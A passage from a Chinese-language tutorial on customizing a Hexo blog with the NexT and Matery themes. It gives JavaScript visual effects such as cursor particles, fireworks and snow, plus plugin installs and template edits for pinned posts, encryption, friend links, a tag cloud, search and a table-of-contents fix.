    if( e.touches.length &gt; 0 ) &#123;
      for( var i = 0; i &lt; e.touches.length; i++ ) &#123;
        addParticle( e.touches[i].clientX, e.touches[i].clientY, possibleColors[Math.floor(Math.random()*possibleColors.length)]);
      &#125;
    &#125;
  &#125;
  
  function onMouseMove(e) &#123;    
    cursor.x = e.clientX;
    cursor.y = e.clientY;
    
    addParticle( cursor.x, cursor.y, possibleColors[Math.floor(Math.random()*possibleColors.length)]);
  &#125;
  
  function addParticle(x, y, color) &#123;
    var particle = new Particle();
    particle.init(x, y, color);
    particles.push(particle);
  &#125;
  
  function updateParticles() &#123;
    
    // Updated
    for( var i = 0; i &lt; particles.length; i++ ) &#123;
      particles[i].update();
    &#125;
    
    // Remove dead particles
    for( var i = particles.length -1; i &gt;= 0; i-- ) &#123;
      if( particles[i].lifeSpan &lt; 0 ) &#123;
        particles[i].die();
        particles.splice(i, 1);
      &#125;
    &#125;
    
  &#125;
  
  function loop() &#123;
    requestAnimationFrame(loop);
    updateParticles();
  &#125;
  
  /**
   * Particles
   */
  
  function Particle() &#123;

    this.character = &quot;*&quot;;
    this.lifeSpan = 120; //ms
    this.initialStyles =&#123;
      &quot;position&quot;: &quot;fixed&quot;,
      &quot;top&quot;: &quot;0&quot;, //必须加
      &quot;display&quot;: &quot;block&quot;,
      &quot;pointerEvents&quot;: &quot;none&quot;,
      &quot;z-index&quot;: &quot;10000000&quot;,
      &quot;fontSize&quot;: &quot;20px&quot;,
      &quot;will-change&quot;: &quot;transform&quot;
    &#125;;

    // Init, and set properties
    this.init = function(x, y, color) &#123;

      this.velocity = &#123;
        x:  (Math.random() &lt; 0.5 ? -1 : 1) * (Math.random() / 2),
        y: 1
      &#125;;
      
      this.position = &#123;x: x - 10, y: y - 20&#125;;
      this.initialStyles.color = color;
      console.log(color);

      this.element = document.createElement(&#x27;span&#x27;);
      this.element.innerHTML = this.character;
      applyProperties(this.element, this.initialStyles);
      this.update();
      
      document.body.appendChild(this.element);
    &#125;;
    
    this.update = function() &#123;
      this.position.x += this.velocity.x;
      this.position.y += this.velocity.y;
      this.lifeSpan--;
      
      this.element.style.transform = &quot;translate3d(&quot; + this.position.x + &quot;px,&quot; + this.position.y + &quot;px,0) scale(&quot; + (this.lifeSpan / 120) + &quot;)&quot;;
    &#125;
    
    this.die = function() &#123;
      this.element.parentNode.removeChild(this.element);
    &#125;
    
  &#125;
  
  /**
   * Utils
   */
  
  // Applies css `properties` to an element.
  function applyProperties( target, properties ) &#123;
    for( var key in properties ) &#123;
      target.style[ key ] = properties[ key ];
    &#125;
  &#125;
  
  init();
&#125;)();</code></pre>
<p>然后再<code>themes/matery/layout/layout.ejs</code>文件内添加下面的内容：</p>
<pre><code class="hljs javascript">&lt;script src=<span class="hljs-string">&quot;/js/cursor.js&quot;</span>&gt;&lt;/script&gt;</code></pre>
<h1 id="点击爆炸效果">点击爆炸效果</h1>
<p>首先在<code>themes/next/source/js/src</code>里面建一个叫fireworks.js的文件，代码如下：</p>
<pre><code class="hljs plaintext">&quot;use strict&quot;;

function updateCoords(e) &#123;
    pointerX = (e.clientX || e.touches[0].clientX) - canvasEl.getBoundingClientRect().left, pointerY = e.clientY || e.touches[
        0].clientY - canvasEl.getBoundingClientRect().top
&#125;

function setParticuleDirection(e) &#123;
    var t = anime.random(0, 360) * Math.PI / 180,
        a = anime.random(50, 180),
        n = [-1, 1][anime.random(0, 1)] * a;
    return &#123;
        x: e.x + n * Math.cos(t),
        y: e.y + n * Math.sin(t)
    &#125;
&#125;

function createParticule(e, t) &#123;
    var a = &#123;&#125;;
    return a.x = e, a.y = t, a.color = colors[anime.random(0, colors.length - 1)], a.radius = anime.random(16, 32), a.endPos =
        setParticuleDirection(a), a.draw = function () &#123;
            ctx.beginPath(), ctx.arc(a.x, a.y, a.radius, 0, 2 * Math.PI, !0), ctx.fillStyle = a.color, ctx.fill()
        &#125;, a
&#125;

function createCircle(e, t) &#123;
    var a = &#123;&#125;;
    return a.x = e, a.y = t, a.color = &quot;#F00&quot;, a.radius = 0.1, a.alpha = 0.5, a.lineWidth = 6, a.draw = function () &#123;
        ctx.globalAlpha = a.alpha, ctx.beginPath(), ctx.arc(a.x, a.y, a.radius, 0, 2 * Math.PI, !0), ctx.lineWidth =
            a.lineWidth, ctx.strokeStyle = a.color, ctx.stroke(), ctx.globalAlpha = 1
    &#125;, a
&#125;

function renderParticule(e) &#123;
    for (var t = 0; t &lt; e.animatables.length; t++) &#123;
        e.animatables[t].target.draw()
    &#125;
&#125;

function animateParticules(e, t) &#123;
    for (var a = createCircle(e, t), n = [], i = 0; i &lt; numberOfParticules; i++) &#123;
        n.push(createParticule(e, t))
    &#125;
    anime.timeline().add(&#123;
        targets: n,
        x: function (e) &#123;
            return e.endPos.x
        &#125;,
        y: function (e) &#123;
            return e.endPos.y
        &#125;,
        radius: 0.1,
        duration: anime.random(1200, 1800),
        easing: &quot;easeOutExpo&quot;,
        update: renderParticule
    &#125;).add(&#123;
        targets: a,
        radius: anime.random(80, 160),
        lineWidth: 0,
        alpha: &#123;
            value: 0,
            easing: &quot;linear&quot;,
            duration: anime.random(600, 800)
        &#125;,
        duration: anime.random(1200, 1800),
        easing: &quot;easeOutExpo&quot;,
        update: renderParticule,
        offset: 0
    &#125;)
&#125;

function debounce(e, t) &#123;
    var a;
    return function () &#123;
        var n = this,
            i = arguments;
        clearTimeout(a), a = setTimeout(function () &#123;
            e.apply(n, i)
        &#125;, t)
    &#125;
&#125;
var canvasEl = document.querySelector(&quot;.fireworks&quot;);
if (canvasEl) &#123;
    var ctx = canvasEl.getContext(&quot;2d&quot;),
        numberOfParticules = 30,
        pointerX = 0,
        pointerY = 0,
        tap = &quot;mousedown&quot;,
        colors = [&quot;#FF1461&quot;, &quot;#18FF92&quot;, &quot;#5A87FF&quot;, &quot;#FBF38C&quot;],
        setCanvasSize = debounce(function () &#123;
            canvasEl.width = 2 * window.innerWidth, canvasEl.height = 2 * window.innerHeight, canvasEl.style.width =
                window.innerWidth + &quot;px&quot;, canvasEl.style.height = window.innerHeight + &quot;px&quot;, canvasEl.getContext(
                    &quot;2d&quot;).scale(2, 2)
        &#125;, 500),
        render = anime(&#123;
            duration: 1 / 0,
            update: function () &#123;
                ctx.clearRect(0, 0, canvasEl.width, canvasEl.height)
            &#125;
        &#125;);
    document.addEventListener(tap, function (e) &#123;
        &quot;sidebar&quot; !== e.target.id &amp;&amp; &quot;toggle-sidebar&quot; !== e.target.id &amp;&amp; &quot;A&quot; !== e.target.nodeName &amp;&amp; &quot;IMG&quot; !==
            e.target.nodeName &amp;&amp; (render.play(), updateCoords(e), animateParticules(pointerX, pointerY))
    &#125;, !1), setCanvasSize(), window.addEventListener(&quot;resize&quot;, setCanvasSize, !1)
&#125;
&quot;use strict&quot;;

function updateCoords(e) &#123;
    pointerX = (e.clientX || e.touches[0].clientX) - canvasEl.getBoundingClientRect().left, pointerY = e.clientY || e.touches[
        0].clientY - canvasEl.getBoundingClientRect().top
&#125;

function setParticuleDirection(e) &#123;
    var t = anime.random(0, 360) * Math.PI / 180,
        a = anime.random(50, 180),
        n = [-1, 1][anime.random(0, 1)] * a;
    return &#123;
        x: e.x + n * Math.cos(t),
        y: e.y + n * Math.sin(t)
    &#125;
&#125;

function createParticule(e, t) &#123;
    var a = &#123;&#125;;
    return a.x = e, a.y = t, a.color = colors[anime.random(0, colors.length - 1)], a.radius = anime.random(16, 32), a.endPos =
        setParticuleDirection(a), a.draw = function () &#123;
            ctx.beginPath(), ctx.arc(a.x, a.y, a.radius, 0, 2 * Math.PI, !0), ctx.fillStyle = a.color, ctx.fill()
        &#125;, a
&#125;

function createCircle(e, t) &#123;
    var a = &#123;&#125;;
    return a.x = e, a.y = t, a.color = &quot;#F00&quot;, a.radius = 0.1, a.alpha = 0.5, a.lineWidth = 6, a.draw = function () &#123;
        ctx.globalAlpha = a.alpha, ctx.beginPath(), ctx.arc(a.x, a.y, a.radius, 0, 2 * Math.PI, !0), ctx.lineWidth =
            a.lineWidth, ctx.strokeStyle = a.color, ctx.stroke(), ctx.globalAlpha = 1
    &#125;, a
&#125;

function renderParticule(e) &#123;
    for (var t = 0; t &lt; e.animatables.length; t++) &#123;
        e.animatables[t].target.draw()
    &#125;
&#125;

function animateParticules(e, t) &#123;
    for (var a = createCircle(e, t), n = [], i = 0; i &lt; numberOfParticules; i++) &#123;
        n.push(createParticule(e, t))
    &#125;
    anime.timeline().add(&#123;
        targets: n,
        x: function (e) &#123;
            return e.endPos.x
        &#125;,
        y: function (e) &#123;
            return e.endPos.y
        &#125;,
        radius: 0.1,
        duration: anime.random(1200, 1800),
        easing: &quot;easeOutExpo&quot;,
        update: renderParticule
    &#125;).add(&#123;
        targets: a,
        radius: anime.random(80, 160),
        lineWidth: 0,
        alpha: &#123;
            value: 0,
            easing: &quot;linear&quot;,
            duration: anime.random(600, 800)
        &#125;,
        duration: anime.random(1200, 1800),
        easing: &quot;easeOutExpo&quot;,
        update: renderParticule,
        offset: 0
    &#125;)
&#125;

function debounce(e, t) &#123;
    var a;
    return function () &#123;
        var n = this,
            i = arguments;
        clearTimeout(a), a = setTimeout(function () &#123;
            e.apply(n, i)
        &#125;, t)
    &#125;
&#125;
var canvasEl = document.querySelector(&quot;.fireworks&quot;);
if (canvasEl) &#123;
    var ctx = canvasEl.getContext(&quot;2d&quot;),
        numberOfParticules = 30,
        pointerX = 0,
        pointerY = 0,
        tap = &quot;mousedown&quot;,
        colors = [&quot;#FF1461&quot;, &quot;#18FF92&quot;, &quot;#5A87FF&quot;, &quot;#FBF38C&quot;],
        setCanvasSize = debounce(function () &#123;
            canvasEl.width = 2 * window.innerWidth, canvasEl.height = 2 * window.innerHeight, canvasEl.style.width =
                window.innerWidth + &quot;px&quot;, canvasEl.style.height = window.innerHeight + &quot;px&quot;, canvasEl.getContext(
                    &quot;2d&quot;).scale(2, 2)
        &#125;, 500),
        render = anime(&#123;
            duration: 1 / 0,
            update: function () &#123;
                ctx.clearRect(0, 0, canvasEl.width, canvasEl.height)
            &#125;
        &#125;);
    document.addEventListener(tap, function (e) &#123;
        &quot;sidebar&quot; !== e.target.id &amp;&amp; &quot;toggle-sidebar&quot; !== e.target.id &amp;&amp; &quot;A&quot; !== e.target.nodeName &amp;&amp; &quot;IMG&quot; !==
            e.target.nodeName &amp;&amp; (render.play(), updateCoords(e), animateParticules(pointerX, pointerY))
    &#125;, !1), setCanvasSize(), window.addEventListener(&quot;resize&quot;, setCanvasSize, !1)
&#125;;</code></pre>
<p>打开<code>themes/next/layout/_layout.swig</code>,在<code>&lt;/body&gt;</code>上面写下如下代码：</p>
<pre><code class="hljs plaintext">&lt;canvas class=&quot;fireworks&quot; style=&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;/canvas&gt; 
&lt;script type=&quot;text/javascript&quot; src=&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;&gt;&lt;/script&gt; 
&lt;script type=&quot;text/javascript&quot; src=&quot;/js/fireworks.js&quot;&gt;&lt;/script&gt;</code></pre>
<p>打开主题配置文件，最后填上：</p>
<pre><code class="hljs plaintext"># Fireworks
fireworks: true</code></pre>
<h1 id="添加雪花飘落效果">添加雪花飘落效果</h1>
<p>、在<code>themes/matery/source/js</code>目录下新建<code>snow.js</code>文件，将内容复制粘贴到<code>snow.js</code>即可：</p>
<pre><code class="hljs plaintext">(function($)&#123;
   $.fn.snow = function(options)&#123;
   var $flake = $(&#x27;&lt;div id=&quot;snowbox&quot; /&gt;&#x27;).css(&#123;&#x27;position&#x27;: &#x27;absolute&#x27;,&#x27;z-index&#x27;:&#x27;9999&#x27;, &#x27;top&#x27;: &#x27;-50px&#x27;&#125;).html(&#x27;&amp;#10052;&#x27;),
   documentHeight 	= $(document).height(),
   documentWidth	= $(document).width(),
   defaults = &#123;
      minSize		: 10,
      maxSize		: 20,
      newOn		: 1000,
      flakeColor	: &quot;#AFDAEF&quot; /* 此处可以定义雪花颜色，若要白色可以改为#FFFFFF */
   &#125;,
   options	= $.extend(&#123;&#125;, defaults, options);
   var interval= setInterval( function()&#123;
   var startPositionLeft = Math.random() * documentWidth - 100,
   startOpacity = 0.5 + Math.random(),
   sizeFlake = options.minSize + Math.random() * options.maxSize,
   endPositionTop = documentHeight - 200,
   endPositionLeft = startPositionLeft - 500 + Math.random() * 500,
   durationFall = documentHeight * 10 + Math.random() * 5000;
   $flake.clone().appendTo(&#x27;body&#x27;).css(&#123;
      left: startPositionLeft,
      opacity: startOpacity,
      &#x27;font-size&#x27;: sizeFlake,
      color: options.flakeColor
   &#125;).animate(&#123;
      top: endPositionTop,
      left: endPositionLeft,
      opacity: 0.2
   &#125;,durationFall,&#x27;linear&#x27;,function()&#123;
      $(this).remove()
   &#125;);
   &#125;, options.newOn);
    &#125;;
&#125;)(jQuery);
$(function()&#123;
    $.fn.snow(&#123; 
       minSize: 5, /* 定义雪花最小尺寸 */
       maxSize: 50,/* 定义雪花最大尺寸 */
       newOn: 300  /* 定义密集程度，数字越小越密集 */
    &#125;);
&#125;);</code></pre>
<p>然后再<code>themes/matery/layout/layout.ejs</code>文件内添加下面的内容：</p>
<pre><code class="hljs javascript">&lt;script src=<span class="hljs-string">&quot;/js/snow.js&quot;</span>&gt;&lt;/script&gt;</code></pre>
<h1 id="设置博文内链接为蓝色">设置博文内链接为蓝色</h1>
<p>打开<code>themes/next/source/css/_common/components/post/post.styl</code>文件，将下面的代码复制到文件最后：</p>
<pre><code class="hljs plaintext">.post-body p a&#123;
     color: #0593d3;
     border-bottom: none;
     &amp;:hover &#123;
       color: #0477ab;
       text-decoration: underline;
     &#125;
   &#125;</code></pre>
<h1 id="圆角">圆角</h1>
<p>在<code>source/_data/variables.styl</code>中输入以下代码</p>
<pre><code class="hljs javascript"><span class="hljs-comment">// 圆角设置</span>
$border-radius-inner     = 20px 20px 20px 20px;
$border-radius           = 20px;
<span class="hljs-number">123</span></code></pre>
<p>然后在 NexT 的配置文件 <code>_config.next.yml</code> 中取消 <code>variables.styl</code> 的注释：</p>
<pre><code class="hljs javascript"><span class="hljs-attr">custom_file_path</span>:
  <span class="hljs-attr">variable</span>: source/_data/variables.<span class="hljs-property">styl</span></code></pre>
<h1 id="个性化回顶">个性化回顶</h1>
<p>将 back-to-top 按钮添加图片背景，并添加 CSS3 动效即可。</p>
<p>首先，找到自己喜欢的图片素材放到 source\images\ 目录下。</p>
<p><a href="http://yearito.cn/images/scroll.png"> 下载图片</a></p>
<p>然后在自定义样式文件中添加如下代码：</p>
<pre><code class="hljs plaintext">themes\next\source\css\_custom\custom.styl//自定义回到顶部样式
.back-to-top &#123;
  right: 60px;
  width: 70px;  //图片素材宽度
  height: 900px;  //图片素材高度
  top: -900px;
  bottom: unset;
  transition: all .5s ease-in-out;
  background: url(&quot;/images/scroll.png&quot;);

  //隐藏箭头图标
  &gt; i &#123;
    display: none;
  &#125;

  &amp;.back-to-top-on &#123;
    bottom: unset;
    top: 100vh &lt; (900px + 200px) ? calc( 100vh - 900px - 200px ) : 0px;
  &#125;
&#125;</code></pre>
<h1 id="打字特效">打字特效</h1>
<p>点击下方按钮下载相应的脚本，并置于 themes\next\source\js\ 目录下：</p>
<p><a href="https://script-1256884783.file.myqcloud.com/activate-power-mode.min.js">打字特效</a></p>
<p>在主题自定义布局文件中添加以下代码：</p>
<pre><code class="hljs plaintext">themes\next\layout\_custom\custom.swig&#123;# 打字特效 #&#125;
&#123;% if theme.typing_effect %&#125;
  &lt;script src=&quot;/js/activate-power-mode.min.js&quot;&gt;&lt;/script&gt;
  &lt;script&gt;
    POWERMODE.colorful = &#123;&#123; theme.typing_effect.colorful &#125;&#125;;
    POWERMODE.shake = &#123;&#123; theme.typing_effect.shake &#125;&#125;;
    document.body.addEventListener(&#x27;input&#x27;, POWERMODE);
  &lt;/script&gt;
&#123;% endif %&#125;</code></pre>
<p>如果 custom.swig 文件不存在，需要手动新建并在布局页面中 body 末尾引入：</p>
<pre><code class="hljs plaintext">themes\next\layout\_layout.swig      ...
      &#123;% include &#x27;_third-party/exturl.swig&#x27; %&#125;
      &#123;% include &#x27;_third-party/bookmark.swig&#x27; %&#125;
      &#123;% include &#x27;_third-party/copy-code.swig&#x27; %&#125;

+     &#123;% include &#x27;_custom/custom.swig&#x27; %&#125;
    &lt;/body&gt;
  &lt;/html&gt;</code></pre>
<p>在主题配置文件中添加以下代码：</p>
<pre><code class="hljs plaintext">themes\next\_config.yml# typing effect
typing_effect:
  colorful: true  # 礼花特效
  shake: false  # 震动特效</code></pre>
<h1 id="置顶文章">置顶文章</h1>
<p>安装插件</p>
<pre><code class="hljs plaintext">npm install hexo-generator-topindex --save</code></pre>
<p>给需要置顶的文章加top参数！</p>
<p>添加置顶标志</p>
<p>打开：/bolg/themes/next/layout/_macro/post.swig 文件<br>
在<code>&lt;div class=&quot;post-meta&quot;&gt; </code> 标签下，插入以下代码：</p>
<pre><code class="hljs swig"> &#123;% if post.top %&#125;
      &lt;span class=&quot;post-meta-item-icon&quot;&gt;
      &lt;i class=&quot;fa fa-thumb-tack&quot;&gt;&lt;/i&gt;
      &lt;/span&gt;
      &lt;font color=red&gt;置顶&lt;/font&gt;
      &lt;span class=&quot;post-meta-divider&quot;&gt;|&lt;/span&gt;
&#123;% endif %&#125;</code></pre>
<h1 id="encrypt">encrypt</h1>
<pre><code class="hljs plaintext">npm install --save hexo-blog-encrypt</code></pre>
<ul>
<li>将 “password” 字段添加到文章信息</li>
</ul>
<pre><code class="hljs plaintext">---
title: Hello World
date: 2016-03-30 21:18:02
password: 1
---</code></pre>
<ul>
<li>
<p>再使用 <code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</code> 在本地预览加密的文章.</p>
</li>
<li>
<blockquote>
<p>title: VNCTF2022—WP<br>
date: 2022-02-12 13:27:31<br>
tags:</p>
<pre><code>   - wp
          - CTF
</code></pre>
<p>categories: CTF-wp<br>
password: 1111111111111111<br>
wrong_pass_message: 抱歉, 这个密码看着不太对, 请再试试.<br>
abstract: 有东西被加密了, 请输入密码查看.</p>
</blockquote>
</li>
</ul>
<p>加密主题</p>
<ul>
<li>[default]</li>
<li>[blink]</li>
<li>[shrink]</li>
<li>[flip]</li>
<li>[up]</li>
<li>[surge]</li>
<li>[wave]</li>
<li>[xray]</li>
</ul>
<h1 id="添加图片查看器">添加图片查看器</h1>
<p>~~</p>
<p>对于next主题的fancybox插件我找了很多资料发现都不能正常安装插件，总是显示克隆的错误的字典，想必应该是fancybox插件的地址换了吧，然后我就找到了fancybox的GitHub地址，直接用这个地址下载，顺利成功使用fancybox插件！</p>
<pre><code class="hljs plaintext">cd themes/next
git clone https://github.com/theme-next/theme-next-fancybox3.git</code></pre>
<p>当然也可能会失效，我把官网放出来</p>
<p>fancybox官网：<a href="https://github.com/theme-next/theme-next-fancybox3">https://github.com/theme-next/theme-next-fancybox3</a></p>
<p>~~</p>
<p>上面这个方法退休了，国内访问如果用上面这个方法会影响站点加载速度，有更好的方法麻烦评论区告诉我，谢谢哦</p>
<h1 id="友链">友链</h1>
<h2 id="在博客页面新建页面">在博客页面新建页面</h2>
<pre><code class="hljs plaintext">hexo new page links</code></pre>
<p>这点需要注意，输入这个指令后会在根目录/source下生成一个links文件夹，打开其中的index.md文件，注意一定要在头部写上如下，尤其注意type！</p>
<pre><code class="hljs plaintext">---
title: 友链
date: 2022-01-18 10:00:39
type: &quot;links&quot;
---</code></pre>
<p>如果不想让这个页面有评论，就再加一个comment。</p>
<h2 id="配置-menu">配置 menu</h2>
<p>主题配置文件下在<code>menu</code>下添加</p>
<pre><code class="hljs plaintext">links: /links/ || link</code></pre>
<p>在 <code>/themes/next/languages/zh-CN.yml</code> 文件中 <code>menu</code> 下增加中文描述</p>
<pre><code class="hljs plaintext">links: 友链</code></pre>
<h2 id="新增-linksswig-页">新增 links.swig 页</h2>
<p>在 <code>/themes/next/layout/</code> 新建 links.swig，内容如下：</p>
<pre><code class="hljs plaintext"> &#123;% block content %&#125;
  &#123;######################&#125;
  &#123;### LINKS BLOCK ###&#125;
  &#123;######################&#125;

    &lt;div id=&quot;links&quot;&gt;
        &lt;style&gt;

            #links&#123;
               margin-top: 5rem;
            &#125;

            .links-content&#123;
                margin-top:1rem;
            &#125;

            .link-navigation::after &#123;
                content: &quot; &quot;;
                display: block;
                clear: both;
            &#125;

            .card &#123;
                width: 300px;
                font-size: 1rem;
                padding: 10px 20px;
                border-radius: 4px;
                transition-duration: 0.15s;
                margin-bottom: 1rem;
                display:flex;
            &#125;
            .card:nth-child(odd) &#123;
                float: left;
            &#125;
            .card:nth-child(even) &#123;
                float: right;
            &#125;
            .card:hover &#123;
                transform: scale(1.1);
                box-shadow: 0 2px 6px 0 rgba(0, 0, 0, 0.12), 0 0 6px 0 rgba(0, 0, 0, 0.04);
            &#125;
            .card a &#123;
                border:none;
            &#125;
            .card .ava &#123;
                width: 3rem!important;
                height: 3rem!important;
                margin:0!important;
                margin-right: 1em!important;
                border-radius:4px;

            &#125;
            .card .card-header &#123;
                font-style: italic;
                overflow: hidden;
                width: 236px;
            &#125;
            .card .card-header a &#123;
                font-style: normal;
                color: #2bbc8a;
                font-weight: bold;
                text-decoration: none;
            &#125;
            .card .card-header a:hover &#123;
                color: #d480aa;
                text-decoration: none;
            &#125;
            .card .card-header .info &#123;
                font-style:normal;
                color:#a3a3a3;
                font-size:14px;
                min-width: 0;
                text-overflow: ellipsis;
                overflow: hidden;
                white-space: nowrap;
            &#125;
        &lt;/style&gt;
        &lt;div class=&quot;links-content&quot;&gt;
            &lt;div class=&quot;link-navigation&quot;&gt;

                &#123;% for link in theme.mylinks %&#125;

                    &lt;div class=&quot;card&quot;&gt;
                        &lt;img class=&quot;ava&quot; src=&quot;&#123;&#123; link.avatar &#125;&#125;&quot;/&gt;
                        &lt;div class=&quot;card-header&quot;&gt;
                           &lt;div&gt;
                              &lt;a href=&quot;&#123;&#123; link.site &#125;&#125;&quot; target=&quot;_blank&quot;&gt; &#123;&#123; link.nickname &#125;&#125;&lt;/a&gt;
                              &lt;a href=&quot;&#123;&#123; link.site &#125;&#125;&quot; target=&quot;_blank&quot;&gt;&lt;span class=&quot;focus-links&quot;&gt;关注&lt;/span&gt;&lt;/a&gt;
                           &lt;/div&gt;
                           &lt;div class=&quot;info&quot;&gt;&#123;&#123; link.info &#125;&#125;&lt;/div&gt;
                        &lt;/div&gt;
                    &lt;/div&gt;

                &#123;% endfor %&#125;

            &lt;/div&gt;
            &#123;&#123; page.content &#125;&#125;
            &lt;/div&gt;
        &lt;/div&gt;

  &#123;##########################&#125;
  &#123;### END LINKS BLOCK ###&#125;
  &#123;##########################&#125;
&#123;% endblock %&#125;</code></pre>
<h2 id="修改-pageswig">修改 page.swig</h2>
<p>修改 <code>/themes/next/layout/page.swig</code> 文件，在开头附近添加如下代码：</p>
<pre><code class="hljs plaintext">&#123;% elif page.type === &#x27;links&#x27; and not page.title %&#125;
&#123;&#123; __(&#x27;title.links&#x27;) + page_title_suffix &#125;&#125;</code></pre>
<p>大概位置如图：</p>
<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-fNBLrXPG-1648815291377)(博客制作遇到的问题/image-20220118100857169.png)]</p>
<h2 id="引入-linksswig">引入 links.swig</h2>
<p>接着在 <code>/themes/next/layout/page.swig</code> 中 <code>PAGE BODY</code> 内部，引入刚才新建的 <code>page.swig</code> :</p>
<pre><code class="hljs plaintext">&#123;% elif page.type === &#x27;links&#x27; %&#125;
    &#123;% include &#x27;links.swig&#x27; %&#125;</code></pre>
<p>添加位置不唯一，我添加的是这：</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/2d8066902299f3cf0ab9c749adef1555.png?x-oss-process=hzy" alt="image-20220118100921527"></p>
<h2 id="配置友链">配置友链</h2>
<p>到这里关于友链的配置就完成了，接下来，在 <code>/themes/next/_config.yml</code> 文件中配置友链，末尾处新增 <code>mylinks</code> ，如下</p>
<pre><code class="hljs plaintext">mylinks:
# 名称：故里
# 地址：https://hzy2003628.top/
# 描述：
# 头像：https://hzy2003628.top/images/avatar.png


- nickname: 影影的家  #友链名称
  site: https://wsy2003328.top/  #友链地址
  info: 流年，谁给过的倾城。  #友链说明
  avatar: https://wsy2003328.top/images/avatar.png  #友链头像</code></pre>
<h1 id="添加标签云">添加标签云</h1>
<h2 id="安装插件">安装插件</h2>
<pre><code class="hljs plaintext">npm install hexo-tag-cloud@^2.0.* --save</code></pre>
<h2 id="配置插件因为我的博客是swig所以只说明swig的相关配置">配置插件（因为我的博客是swig，所以只说明swig的相关配置）</h2>
<p>在主题文件夹找到文件 <code>theme/next/layout/_macro/sidebar.swig</code>, 然后添加如下代码：</p>
<pre><code class="hljs plaintext">&#123;% if site.tags.length &gt; 1 %&#125;
&lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot; src=&quot;/js/tagcloud.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot; src=&quot;/js/tagcanvas.js&quot;&gt;&lt;/script&gt;
&lt;div class=&quot;widget-wrap&quot;&gt;
    &lt;h3 class=&quot;widget-title&quot;&gt;标签云&lt;/h3&gt;
    &lt;div id=&quot;myCanvasContainer&quot; class=&quot;widget tagcloud&quot;&gt;
        &lt;canvas width=&quot;250&quot; height=&quot;250&quot; id=&quot;resCanvas&quot; style=&quot;width=100%&quot;&gt;
            &#123;&#123; list_tags() &#125;&#125;
        &lt;/canvas&gt;
    &lt;/div&gt;
&lt;/div&gt;
&#123;% endif %&#125;</code></pre>
<h2 id="主题配置">主题配置</h2>
<p>博文置在next主题根目录，找到 <code>_config.yml</code>配置文件然后在最后添加如下的配置项，可以自定义标签云的字体和颜色，还有突出高亮:</p>
<pre><code class="hljs plaintext"># hexo-tag-cloud
tag_cloud:
    textFont: Trebuchet MS, Helvetica
    textColor: &#x27;#333&#x27; //字体颜色
    textHeight: 25 //字体高度
    outlineColor: &#x27;#E2E1D1&#x27;
    maxSpeed: 0.1 //文字滚动速度</code></pre>
<h1 id="博文置顶">博文置顶</h1>
<h3 id="安装插件">安装插件</h3>
<p>在根目录Blog打开Git Bash，执行下面的命令：</p>
<pre><code class="hljs text">npm uninstall hexo-generator-index --save
npm install hexo-generator-index-pin-top --save</code></pre>
<h3 id="设置置顶标志">设置置顶标志</h3>
<p>打开blog/themes/next/layout/_macro目录下的post.swig文件，定位到<div class="post-meta">标签下，插入如下代码：</div></p>
<pre><code class="hljs text">&#123;% if post.top %&#125;
  &lt;i class=&quot;fa fa-thumb-tack&quot;&gt;&lt;/i&gt;
  &lt;font color=7D26CD&gt;置顶&lt;/font&gt;
  &lt;span class=&quot;post-meta-divider&quot;&gt;|&lt;/span&gt;
&#123;% endif %&#125;</code></pre>
<h3 id="在文章中添加top">在文章中添加top</h3>
<p>然后在需要置顶的文章的Front-matter中加上top: true即可，如下：</p>
<pre><code class="hljs text">---
title: Hello World

top: true

---</code></pre>
<h1 id="博客不显示图片">博客不显示图片</h1>
<p>在写博客的过程中难免需要插图，而有时候在插图时在博客中无法正常显示图片，这个时候就需要以下几个步骤：</p>
<h2 id="修改博客根目录中_configyml文件的配置项post_asset_folder为true">修改博客根目录中<code>_config.yml</code>文件的配置项<code>post_asset_folder</code>为<code>true</code></h2>
<blockquote>
<p>post_asset_folder: true</p>
</blockquote>
<p>完成此设置后，当你通过<code>hexo new 文件名</code>新建博客后，会产生一个和文件同名的文件夹。</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/672a88fcabf7bee0c06e728ece95fcfe.webp?x-oss-process=hzy" alt=" "></p>
<h2 id="在博客根目录中下使用npm安装插件">在博客根目录中下使用npm安装插件</h2>
<p>（回到博客根目录下在空白部分点右键，进入<code>git bush here</code>）</p>
<pre><code class="hljs plaintext">npm install https://github.com/CodeFalling/hexo-asset-image --save</code></pre>
<p>完成以上步骤后就可以正常插图了！在这里再强调一下插图的语法是</p>
<pre><code class="hljs plaintext">![ ]( )</code></pre>
<p>然后选择对路径之后就会正常显示图片！</p>
<h1 id="hexo博客添加搜索功能">Hexo博客添加搜索功能</h1>
<p>安装插件，在博客根目录执行命令</p>
<pre><code class="hljs plaintext">npm install hexo-generator-searchdb --save</code></pre>
<p>修改根目录下的<code>_config.yml</code></p>
<pre><code class="hljs plaintext">search:
  path: search.xml
  field: post
  format: html
  limit: 10000
  content: true</code></pre>
<p>修改主题配置文件./themes/next下的<code>_config.yml</code>文件</p>
<pre><code class="hljs plaintext">local_search:
   enable: true</code></pre>
<h1 id="hexo文章目录点击不跳转html没有生成href">hexo文章目录点击不跳转，html没有生成href</h1>
<p>hexo搭建博客，发现文章目录点击无反应，f12看一下会发现toc-link后面没有href属性<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/20220620095756.png?x-oss-process=hzy" alt="image-20220620095747989"></p>
<p>点击测试出现报错</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/20220620100220.png?x-oss-process=hzy" alt="image-20220620100220507"></p>
<p>进入根目录的 <code>node_modules\hexo-toc\lib\filter.js</code> 中，把 28 行～31 行修改为：</p>
<pre><code class="hljs plaintext">$title.attr(&#x27;id&#x27;, id);
// $title.children(&#x27;a&#x27;).remove();
// $title.html( &#x27;&lt;span id=&quot;&#x27; + id + &#x27;&quot;&gt;&#x27; + $title.html() + &#x27;&lt;/span&gt;&#x27; );
// $title.removeAttr(&#x27;id&#x27;);</code></pre>
<p>然后部署一下就可以了</p>
<blockquote>
<p>有的人可能没有hexo-toc，就像我，这个时候下载一下就可以了</p>
<p>npm install hexo-toc --save</p>
</blockquote>
